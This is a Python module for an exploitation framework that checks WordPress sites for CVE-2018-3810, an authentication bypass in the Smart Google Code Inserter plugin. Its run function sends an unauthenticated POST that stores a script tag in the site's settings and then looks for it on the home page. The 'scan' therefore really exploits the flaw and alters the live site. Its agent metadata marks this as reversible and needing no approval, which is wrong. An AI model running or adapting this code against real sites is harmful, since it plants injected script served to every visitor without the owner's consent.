#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oturia Smart Google Code Inserter plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass Detection',
        'description': 'Oturia Smart Google Code Inserter plugin before 3.5 for WordPress allows unauthenticated attackers to insert arbitrary JavaScript or HTML code (via the sgcgoogleanalytic parameter) that runs on all pages served by WordPress. The saveGoogleCode() function in smartgooglecode.php does not check if the current request is made by an authorized user, thus allowing any unauthenticated user to successfully update the inserted code.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wordpress', 'google', 'edb', 'oturia', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/43420',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-3810',
            'https://wordpress.org/plugins/smart-google-code-inserter/#developers',
            'https://limbenjamin.com/articles/smart-google-code-inserter-auth-bypass.html',
            'https://wpvulndb.com/vulnerabilities/8987',
        ],
        'cve': 'CVE-2018-3810',
    }

    def run(self):
        path = '/wp-admin/options-general.php?page=smartcode'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='sgcgoogleanalytic=<script>console.log("document.domain")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode')
        if not r:
            return False
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>console.log("document.domain")</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass detected', path=path)
            return True
        return False

